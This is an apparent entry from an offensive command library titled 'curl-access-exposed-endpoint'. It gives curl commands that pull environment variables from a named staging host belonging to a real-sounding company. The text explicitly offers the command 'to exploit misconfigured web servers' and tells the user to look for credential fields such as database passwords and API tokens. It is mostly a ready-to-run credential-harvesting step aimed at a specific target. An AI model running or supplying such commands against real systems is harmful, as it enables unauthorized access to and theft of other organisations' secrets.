---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: 'curl https://staging.status.ai-apps-comms.ibm.com/env'
tags:
  - recon
  - web-access
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:33:12.409Z'
verified: false
validated: true
submitted: true
---
# curl-access-exposed-endpoint

## Command

```bash
curl https://staging.status.ai-apps-comms.ibm.com/env
```

## Description

This command performs a simple HTTP GET request to a publicly exposed staging endpoint, retrieving cleartext environment variables that may contain sensitive credentials. Use it to exploit misconfigured web servers lacking access controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `URL` | The target endpoint URL (e.g., /env) | Yes |

## Examples

### Basic Usage

```bash
curl https://staging.status.ai-apps-comms.ibm.com/env
```

### Advanced Usage

```bash
curl -s https://staging.status.ai-apps-comms.ibm.com/env | jq '.'
```
(Assumes JSON output; use jq for parsing if installed)

## Expected Output

Raw text or JSON response with environment variables, e.g., {"DB_PASSWORD":"secret123", "API_TOKEN":"abc123"}. Look for credential-like fields.

## Related

- [[Related Procedure: Access-Exposed-Staging-Endpoint-for-Credential-Retrieval]]
